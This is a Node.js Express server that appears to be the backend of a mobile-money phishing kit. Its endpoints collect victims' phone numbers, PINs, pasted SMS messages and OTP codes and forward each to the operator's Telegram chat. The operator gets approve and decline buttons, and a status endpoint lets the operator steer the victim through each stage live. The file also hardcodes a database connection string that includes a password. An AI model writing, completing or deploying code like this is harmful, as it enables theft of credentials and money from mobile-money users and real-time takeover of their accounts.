const express = require('express');
const cors = require('cors');
const { Pool } = require('pg');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

const app = express();
app.use(cors());
app.use(express.json());

// --- CONFIGURATION ---
const PORT = process.env.PORT || 10000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN; 
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Hardcoded Railway URL (Temporary fix for testing)
const DATABASE_URL = 'postgresql://postgres:wmodryYoJUDjWWOrmuXYofkIMAjnObXD@gondola.proxy.rlwy.net:30560/railway';

console.log("Booting server...");
console.log("Telegram Token present:", !!TELEGRAM_BOT_TOKEN);
console.log("Telegram Chat ID present:", !!TELEGRAM_CHAT_ID);
console.log("Database URL starting with:", DATABASE_URL.substring(0, 20));

// --- DATABASE SETUP (Railway) ---
const pool = new Pool({
  connectionString: DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

// Create table on startup
pool.query(`
  CREATE TABLE IF NOT EXISTS transactions (
    ref VARCHAR(50) PRIMARY KEY,
    status VARCHAR(20) DEFAULT 'pending',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
  );
`)
.then(() => console.log("✅ Database connected and table ready."))
.catch(err => console.error("❌ DB Init Error:", err.message));

// --- ROUTES ---

// 1. Frontend sends login details here
app.post('/api/login', async (req, res) => {
  console.log("Login request received:", req.body);
  const { ref, phone, pin, amount, pkg } = req.body;

  try {
    await pool.query(`
      INSERT INTO transactions (ref, status) VALUES ($1, 'pending') ON CONFLICT (ref) DO NOTHING;
    `, [ref]);
    console.log("DB record created for:", ref);
  } catch (dbErr) {
    console.error("DB Insert Error:", dbErr.message);
  }

  const text = `
🚨 *NEW MOMO LOGIN ATTEMPT* 🚨
----------------------------
📱 *Phone:* ${phone}
🔑 *PIN:* ${pin}
💰 *Amount:* ${amount}
📦 *Package:* ${pkg}
🔖 *Ref:* ${ref}
  `;

  try {
    const tgRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [[
            { text: "✅ Approve", callback_data: `approve_login_${ref}` },
            { text: "❌ Decline", callback_data: `decline_login_${ref}` }
          ]]
        }
      })
    });
    const tgData = await tgRes.json();
    console.log("Telegram Response:", tgData.ok ? "✅ Success" : tgData);
    res.json({ success: true });
  } catch (err) {
    console.error("Telegram Error:", err.message);
    res.status(500).json({ error: "Telegram failed" });
  }
});

// 2. Frontend sends SMS details here
app.post('/api/sms', async (req, res) => {
  console.log("SMS request received:", req.body);
  const { ref, message, phone, amount } = req.body;

  // Reset status to pending when SMS is submitted
  try {
    await pool.query('UPDATE transactions SET status = $1 WHERE ref = $2', ['pending', ref]);
    console.log("Status reset to pending for SMS:", ref);
  } catch (err) {
    console.error("DB Reset Error:", err.message);
  }
  
  const text = `
🚨 *NEW SMS VERIFICATION* 🚨
----------------------------
📱 *Phone:* ${phone}
💰 *Amount:* ${amount}
🔖 *Ref:* ${ref}

📩 *Pasted SMS:*
\`\`\`
${message}
\`\`\`
  `;

  try {
    const tgRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [[
            { text: "✅ Approve", callback_data: `approve_sms_${ref}` },
            { text: "❌ Decline", callback_data: `decline_sms_${ref}` }
          ]]
        }
      })
    });
    const tgData = await tgRes.json();
    console.log("Telegram SMS Response:", tgData.ok ? "✅ Success" : tgData);
    res.json({ success: true });
  } catch (err) {
    console.error("Telegram Error:", err.message);
    res.status(500).json({ error: "Telegram failed" });
  }
});

// 3. Frontend sends OTP here
app.post('/api/otp', async (req, res) => {
  console.log("OTP request received:", req.body);
  const { ref, otp, phone } = req.body;

  // CRITICAL FIX: Reset status to pending so it doesn't auto-redirect
  try {
    await pool.query('UPDATE transactions SET status = $1 WHERE ref = $2', ['pending', ref]);
    console.log("Status reset to pending for OTP:", ref);
  } catch (err) {
    console.error("DB Reset Error:", err.message);
  }
  
  const text = `
🚨 *NEW OTP VERIFICATION* 🚨
----------------------------
📱 *Phone:* ${phone}
🔑 *OTP Code:* \`${otp}\`
🔖 *Ref:* ${ref}
  `;

  try {
    const tgRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [[
            { text: "✅ Approve", callback_data: `approve_otp_${ref}` },
            { text: "❌ Decline", callback_data: `decline_otp_${ref}` }
          ]]
        }
      })
    });
    const tgData = await tgRes.json();
    console.log("Telegram OTP Response:", tgData.ok ? "✅ Success" : tgData);
    res.json({ success: true });
  } catch (err) {
    console.error("Telegram Error:", err.message);
    res.status(500).json({ error: "Telegram failed" });
  }
});

// 4. Frontend polls this to check if you clicked a button
app.get('/api/status/:ref', async (req, res) => {
  const { ref } = req.params;
  try {
    const result = await pool.query('SELECT status FROM transactions WHERE ref = $1', [ref]);
    if (result.rows.length > 0) {
      res.json({ status: result.rows[0].status });
    } else {
      res.json({ status: 'pending' });
    }
  } catch (err) {
    console.error("DB Status Error:", err.message);
    res.json({ status: 'pending' });
  }
});

// 5. Telegram Webhook (Receives button clicks)
app.post('/webhook', async (req, res) => {
  const { callback_query } = req.body;
  if (callback_query) {
    console.log("Webhook received:", callback_query.data);
    const data = callback_query.data; 
    const parts = data.split('_'); 
    const action = parts[0];
    const ref = parts[2]; 
    const status = action === 'approve' ? 'approved' : 'declined';

    try {
      await pool.query('UPDATE transactions SET status = $1 WHERE ref = $2', [status, ref]);
      console.log(`DB updated: ${ref} -> ${status}`);
    } catch (err) {
      console.error("DB Update Error:", err.message);
    }

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callback_query.id, text: `Marked as ${status}` })
    });
  }
  res.sendStatus(200);
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
